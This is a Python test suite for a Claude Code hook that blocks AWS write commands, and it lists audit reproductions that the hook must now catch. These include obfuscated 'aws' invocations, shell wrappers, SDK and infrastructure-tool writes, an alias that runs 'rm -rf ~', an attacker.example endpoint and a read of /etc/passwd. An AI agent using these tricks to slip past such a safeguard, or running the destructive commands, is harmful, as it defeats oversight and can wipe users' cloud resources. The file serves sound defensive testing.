"""Security-audit regressions for the optional Claude Code hook (HOOK-1..6, READONLY-5/6, CODE-4).

Each list below holds the audit's reproductions: they were allowed (exit 0) before the fix and must be blocked now,
next to the reads and prose that must keep working.
"""

import json
import os
import shutil
import subprocess  # tests only: runs the hook script as Claude Code would (not part of the shipped package)
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / "hooks" / "block_aws_writes.py"
sys.path.insert(0, str(HOOK.parent))
import block_aws_writes as hook  # noqa: E402

NO_ALIAS = Path(__file__).resolve().parent / "no-such-dir" / "alias"
hook._ALIAS_FILE = NO_ALIAS        # never read the real ~/.aws/cli/alias from the test suite


def setUpModule():
    hook._ALIAS_FILE = NO_ALIAS


# HOOK-1: unlisted / hyphenated services and single-word subcommands were skipped instead of judged
HIGH_LEVEL_AND_UNKNOWN = [
    "aws ddb put MyTable '{k: v}'",
    "aws ddb select MyTable",
    "aws configservice subscribe --s3-bucket b --sns-topic t --iam-role r",
    "aws nuke",                                              # an alias from ~/.aws/cli/alias
    "aws cognito-idp admin-delete-user --user-pool-id p --username u",
    "aws acm-pca delete-certificate-authority --certificate-authority-arn a",
    "aws sso-admin delete-permission-set --instance-arn a --permission-set-arn p",
    "aws network-firewall delete-firewall --firewall-name f",
    "aws resource-groups delete-group --group-name g",
    "aws ec2-instance-connect send-ssh-public-key --instance-id i --instance-os-user u --ssh-public-key k",
    "aws iot-data publish --topic t",
    "aws s3 cp x s3://b/x",
    "aws deploy push --application-name a --s3-location s3://b/k",
]

# HOOK-2 / READONLY-5: the binary is found case-insensitively and by basename on macOS
BINARY_NAMES = [
    "AWS ec2 terminate-instances --instance-ids i-0",
    "Aws iam delete-user --user-name bob",
    "aWS ec2 terminate-instances --instance-ids i-0",
    "/usr/local/bin/AWS ec2 terminate-instances --instance-ids i-1",
    "aws.exe ec2 terminate-instances --instance-ids i-1",
    "AWS.EXE ec2 terminate-instances --instance-ids i-1",
    "=aws ec2 terminate-instances --instance-ids i-1",          # zsh `=cmd` expansion
    "pipx run awscli ec2 terminate-instances --instance-ids i-1",
]

# HOOK-3 / READONLY-6: quoting, escapes, globs and variables that rebuild `aws ec2 ...`
OBFUSCATED = [
    '"a"ws ec2 terminate-instances --instance-ids i-0',
    "a\\ws ec2 terminate-instances --instance-ids i-0",
    "aw''s ec2 terminate-instances --instance-ids i-0",
    'a""ws ec2 terminate-instances --instance-ids i-1',
    "\\aws ec2 terminate-instances --instance-ids i-1",
    "/usr/local/bin/a?s ec2 terminate-instances --instance-ids i-0",
    "/usr/local/bin/a[w]s ec2 terminate-instances --instance-ids i-0",
    "{a,}ws ec2 terminate-instances --instance-ids i-0",
    "$'\\x61ws' ec2 terminate-instances --instance-ids i-0",
    "$'\\141ws' ec2 terminate-instances --instance-ids i-0",
    'aws "e"c2 terminate-instances --instance-ids i-0',
    "aws e\\c2 terminate-instances --instance-ids i-0",
    "aws 'ec2' describe-instances",                           # even a read: a quoted service is not verifiable
    "aws ec2 'describe-instances'",
    "aws $SVC describe-instances",
    "A=aws; $A ec2 terminate-instances --instance-ids i-1",
    "alias x=aws; x ec2 delete-volume --volume-id v",
    "a=(aws ec2 terminate-instances --instance-ids i-1); \"${a[@]}\"",
    'f() { aws "$@"; }; f ec2 terminate-instances --instance-ids i-1',
    "function aws { command aws ec2 terminate-instances; }",
    "cp /usr/local/bin/aws /tmp/x",
    "printf '[toplevel]\\nsts = !rm -rf ~\\n' > ~/.aws/cli/alias",
]

# READONLY-5 / HOOK (e): global options before the service go through the same forbidden/abbreviation rules
GLOBAL_OPTIONS = [
    "aws --reg us-east-1 ec2 terminate-instances --instance-ids i-1",
    "aws --out json ec2 terminate-instances --instance-ids i-1",
    "aws --prof prod iam delete-user --user-name bob",
    "aws --endpoint-url https://attacker.example ec2 describe-instances",
    "aws --debug sts get-caller-identity",
    "aws --e https://x ec2 describe-instances",
    "aws --r eu-west-1 ec2 describe-instances",                # abbreviation: the next word is no longer verifiable
    "aws --no-verify-ssl ec2 describe-instances",
    "aws ec2 describe-instances --e https://x",                 # short abbreviations after the operation too
    "aws ec2 describe-instances --d",
    "aws sts get-caller-identity --no-verify-ssl",
    "aws ec2 describe-instances --filters=file:///etc/passwd",
    "aws --profile $P ec2 describe-instances",                  # unquoted: word splitting can inject options
    "aws ec2 describe-instances --query 'a|b' --endpoint-url https://evil",
]

# command positions the lexer must follow
STRUCTURE = [
    "ssh host 'aws ec2 terminate-instances --instance-ids i-1'",
    "aws-vault exec prod -- aws ec2 terminate-instances --instance-ids i-1",
    "watch 'aws \"e\"c2 terminate-instances'",
    "bash <<'EOF'\naws ec2 delete-volume --volume-id v\nEOF",
    "bash <<< 'aws ec2 delete-volume --volume-id v'",
    "case x in x) aws \"e\"c2 terminate-instances;; esac",
    "sudo -u root aws ec2 terminate-instances --instance-ids i-1",
    "timeout -s KILL 30 aws ec2 terminate-instances --instance-ids i-1",
    "X=1 \\\naws ec2 terminate-instances --instance-ids i-1",
    "aws sts get-caller-identity # ok\naws ec2 terminate-instances --instance-ids i-1",
    "cat <<EOF\n$(aws ec2 terminate-instances --instance-ids i-1)\nEOF",
    "echo aws ec2 terminate-instances | xargs -0 sh -c",
    "echo ec2 terminate-instances | xargs aws",
    "find ec2 -maxdepth 0 -exec aws {} terminate-instances \\;",
    "source <(echo aws ec2 terminate-instances)",
    "git -c core.pager='aws ec2 terminate-instances --instance-ids i-1' log",
    "env -S 'aws ec2 terminate-instances --instance-ids i-1'",
    "python3 - <<'EOF'\nimport subprocess\nsubprocess.run(['aws','ec2','terminate-instances','--instance-ids','i-1'])\nEOF",
    "aws sts get-caller-identity | awk '{system($1)}'",
]

# HOOK-6 / READONLY-6: AWS writes that never spell out the aws CLI
NO_AWS_WORD = [
    "python3 -c \"import boto3; boto3.client('ec2').terminate_instances(InstanceIds=['i-1'])\"",
    "python3 - <<'EOF'\nimport boto3\nboto3.resource('s3').Bucket('b').objects.all().delete()\nEOF",
    "node -e \"const {EC2Client, TerminateInstancesCommand} = require('@aws-sdk/client-ec2'); "
    "new EC2Client({}).send(new TerminateInstancesCommand({InstanceIds: ['i-1']}))\"",
    "curl --aws-sigv4 'aws:amz:us-east-1:ec2' --user \"$K:$S\" 'https://ec2.amazonaws.com/?Action=TerminateInstances'",
    "awscurl --service ec2 'https://ec2.amazonaws.com/?Action=TerminateInstances'",
    "terraform apply -auto-approve",
    "cd infra && terraform -chdir=x destroy",
    "tofu destroy",
    "terragrunt run-all apply",
    "npx cdk deploy",
    "npx --yes aws-cdk@2 destroy --force",
    "cdk destroy --force",
    "sam deploy --guided",
    "pulumi up --yes",
    "pulumi destroy",
    "serverless deploy",
    "sls remove",
    "eksctl delete cluster --name c",
    "s3cmd del s3://b/k",
    "docker run --rm amazon/aws-cli ec2 terminate-instances --instance-ids i-1",
    "docker run -v ~/.aws:/root/.aws python:3 python x.py",
]

# (g) must keep working: reads, the analyzer's documented commands, and prose
ALLOWED = [
    "AWS sts get-caller-identity",
    "aws --region us-east-1 --output json --no-cli-pager ec2 describe-instances",
    "aws --profile \"$P\" ec2 describe-instances",
    'for p in a b; do aws --profile "$p" sts get-caller-identity; done',
    "AWS_PROFILE=prod aws sts get-caller-identity",
    "aws ec2 describe-instances --query 'Reservations[].Instances[].{Id:InstanceId}' --output table | head",
    "aws ec2 describe-instances \\\n  --region us-east-1",
    "aws ec2 describe-instances 2>&1 | tee out.txt",
    "aws ec2 describe-instances --output text | awk '{print $1}' | sort | uniq -c",
    "time aws sts get-caller-identity",
    "aws help",
    "aws ec2 help",
    "which aws && aws --version",
    "python3 -m analyzer doctor",
    "python3 -m analyzer doctor --profile NAME",
    "python3 -m analyzer scan --profile NAME --dry-run",
    "python3 -m analyzer run --profile a --profile b",
    "python3 -m analyzer summary",
    "python3 -m analyzer policy --with-cost",
    "python3 -m analyzer analyze && python3 -m analyzer report",
    "python3 -m analyzer audit-readonly --strict",
    "echo aws is a cloud",
    'echo "AWS is great"',
    'git commit -m "Block aws s3 rm and aws ec2 terminate-instances in the hook"',
    "git commit -m \"$(cat <<'EOF'\nhook: don't allow aws s3 rm\nEOF\n)\"",
    'grep -rn "aws ec2 terminate-instances" tests/',
    "xargs -0 grep -l aws",
    "find . -name '*.py' -exec grep -l aws {} \\;",
    "sudo grep aws /etc/hosts",
    "cat ~/.aws/config",
    "pip install awscli boto3",
    "ls /usr/local/aws-cli",
    "docker build -t aws-analyzer .",
    "terraform plan",
    "cdk synth",
    "sam build",
    "pulumi preview",
    "python3 -c \"import boto3; print(boto3.client('ec2').describe_instances())\"",
    "python3 - <<'EOF'\nprint('arn:aws:iam::1:role/x')\nEOF",
    "cat > notes.md <<'EOF'\nThe AWS analyzer is read-only. Don't worry.\nEOF",
    "echo it's",
    "ls -la",
]


class TestBlocked(unittest.TestCase):
    def check(self, cases):
        for cmd in cases:
            with self.subTest(cmd=cmd):
                self.assertTrue(hook.violations(cmd), cmd)

    def test_high_level_and_unknown_commands_hook1(self):
        self.check(HIGH_LEVEL_AND_UNKNOWN)

    def test_binary_found_case_insensitively_hook2(self):
        self.check(BINARY_NAMES)

    def test_obfuscated_binary_and_service_hook3_readonly6(self):
        self.check(OBFUSCATED)

    def test_global_options_before_the_service_readonly5(self):
        self.check(GLOBAL_OPTIONS)

    def test_command_positions(self):
        self.check(STRUCTURE)

    def test_writes_without_the_aws_word_hook6(self):
        self.check(NO_AWS_WORD)

    def test_reads_and_prose_still_allowed(self):
        for cmd in ALLOWED:
            with self.subTest(cmd=cmd):
                self.assertEqual(hook.violations(cmd), [], cmd)

    def test_lexer_never_crashes(self):
        pieces = ["aws", "ec2", "terminate-instances", "$(", ")", "`", "'", '"', "\\", "<<E\n", "\nE\n", "${", "}",
                  "$'", "|", ";", "#", "(", "{", " ", "\n", "--reg", "=", "sh -c", "<(", "2>&1", "-exec", "\\;"]
        import random
        rnd = random.Random(5)
        for _ in range(3000):
            text = "".join(rnd.choice(pieces) for _ in range(rnd.randint(1, 12)))
            hook.violations(text)
            hook.prose_violations(text)
        self.assertTrue(hook.violations("$(" * 400 + "aws ec2 terminate-instances" + ")" * 400))

    def test_large_input_stays_fast(self):
        import time
        start = time.monotonic()
        self.assertEqual(hook.violations("cat > x <<EOF\n" + "The aws analyzer reads. " * 10000 + "\nEOF"), [])
        self.assertEqual(hook.violations("echo " + "aws ec2 describe-instances " * 8000), [])
        self.assertTrue(hook.prose_violations("aws is great. " * 10000 + "aws s3 rm s3://b/k"))
        self.assertLess(time.monotonic() - start, 5.0)       # was quadratic: ~20 s for 240 KB


class TestServiceList(unittest.TestCase):
    def test_no_line_wrap_artifacts(self):
        self.assertFalse([s for s in hook._SERVICES if s.startswith("-") or s.endswith("-")])
        for name in ("cognito-idp", "bedrock-agent-runtime", "redshift-serverless", "ddb", "configservice"):
            self.assertIn(name, hook._SERVICES)


class TestAliasFile(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.alias = Path(self.tmp.name) / "alias"
        hook._ALIAS_FILE = self.alias

    def tearDown(self):
        hook._ALIAS_FILE = NO_ALIAS
        self.tmp.cleanup()

    def test_alias_that_redefines_a_read_is_blocked(self):
        self.assertEqual(hook.violations("aws sts get-caller-identity"), [])
        self.alias.write_text("[toplevel]\nsts = !rm -rf /tmp/x\n")
        self.assertTrue(hook.violations("aws sts get-caller-identity"))
        self.alias.write_text("[command ec2]\ndescribe-instances = terminate-instances --instance-ids i-1\n")
        self.assertTrue(hook.violations("aws ec2 describe-instances"))
        self.assertEqual(hook.violations("aws ec2 describe-vpcs"), [])
        self.alias.write_text("[toplevel]\nwhoami = sts get-caller-identity\n")
        self.assertEqual(hook.violations("aws sts get-caller-identity"), [])

    def test_unreadable_alias_file_fails_closed(self):
        self.alias.write_text("not = an\n[ini file\n")
        self.assertTrue(hook.violations("aws sts get-caller-identity"))


class TestToolInputShapes(unittest.TestCase):
    """HOOK-4 (every string, any key, argv arrays, bare strings) and HOOK-5 (malformed input) via the real script."""

    @classmethod
    def setUpClass(cls):
        cls._home = tempfile.TemporaryDirectory()
        cls.env = dict(os.environ, HOME=cls._home.name)

    @classmethod
    def tearDownClass(cls):
        cls._home.cleanup()

    def run_raw(self, data: bytes, script=HOOK, isolated=False, cwd=None):
        argv = [sys.executable] + (["-I"] if isolated else []) + [str(script)]
        return subprocess.run(argv, input=data, capture_output=True, env=self.env, cwd=cwd)

    def run_hook(self, payload, **kw):
        return self.run_raw(json.dumps(payload).encode(), **kw)

    def test_every_string_is_scanned(self):
        write = "aws ec2 terminate-instances --instance-ids i-1"
        for tool_input in ({"command": ["aws", "ec2", "terminate-instances", "--instance-ids", "i-1"]},
                           {"command": ["bash", "-c", write]},
                           {"args": write}, {"code": write}, {"program": write}, {"cmdline": write},
                           {"steps": [{"run": write}]}, write):
            with self.subTest(tool_input=tool_input):
                self.assertEqual(self.run_hook({"tool_name": "mcp__x__exec", "tool_input": tool_input}).returncode, 2)
        self.assertEqual(self.run_hook({"tool_name": "mcp__x__exec",
                                        "tool_input": {"command": ["aws", "sts", "get-caller-identity"]}}).returncode, 0)

    def test_descriptions_are_prose(self):
        ok = {"tool_name": "Bash", "tool_input": {"command": "ls", "description": "AWS identity check for the user's profile"}}
        self.assertEqual(self.run_hook(ok).returncode, 0)
        bad = {"tool_name": "Bash", "tool_input": {"command": "ls", "description": "then aws ec2 terminate-instances"}}
        self.assertEqual(self.run_hook(bad).returncode, 2)
        self.assertEqual(hook._texts({"description": "x", "command": "y", "n": [1, {"content": "z"}]}),
                         [("x", True), ("y", False), ("z", True)])

    def test_malformed_input_fails_closed(self):
        for data in (b"\xff\xfe not json", b"not json", b"", b"[]", b'"aws ec2 terminate-instances"'):
            with self.subTest(data=data):
                r = self.run_raw(data)
                self.assertEqual(r.returncode, 2)
                self.assertIn(b"BLOCKED", r.stderr)
        self.assertEqual(self.run_hook({"tool_name": "Bash"}).returncode, 0)    # nothing to judge

    def test_hook_outside_the_repo_fails_closed_code4(self):
        payload = {"tool_name": "Bash", "tool_input": {"command": "aws ec2 terminate-instances --instance-ids i-1"}}
        with tempfile.TemporaryDirectory() as tmp:
            copy = Path(tmp) / "hooks" / "block_aws_writes.py"
            copy.parent.mkdir()
            shutil.copy(HOOK, copy)
            r = self.run_hook(payload, script=copy, isolated=True, cwd=tmp)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn(b"could not be loaded", r.stderr)
            read = {"tool_name": "Bash", "tool_input": {"command": "aws sts get-caller-identity"}}
            self.assertEqual(self.run_hook(read, script=copy, isolated=True, cwd=tmp).returncode, 2)
            plain = {"tool_name": "Bash", "tool_input": {"command": "ls -la"}}
            self.assertEqual(self.run_hook(plain, script=copy, isolated=True, cwd=tmp).returncode, 0)

    def test_broken_analyzer_package_fails_closed_code4(self):
        payload = {"tool_name": "Bash", "tool_input": {"command": "aws ec2 terminate-instances --instance-ids i-1"}}
        with tempfile.TemporaryDirectory() as tmp:
            copy = Path(tmp) / "hooks" / "block_aws_writes.py"
            copy.parent.mkdir()
            shutil.copy(HOOK, copy)
            shutil.copytree(ROOT / "analyzer", Path(tmp) / "analyzer", ignore=shutil.ignore_patterns("__pycache__"))
            with open(Path(tmp) / "analyzer" / "allowlist.py", "a") as f:
                f.write("\nthis is ( not python\n")
            r = self.run_hook(payload, script=copy, isolated=True, cwd=tmp)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn(b"SyntaxError", r.stderr)


if __name__ == "__main__":
    unittest.main()
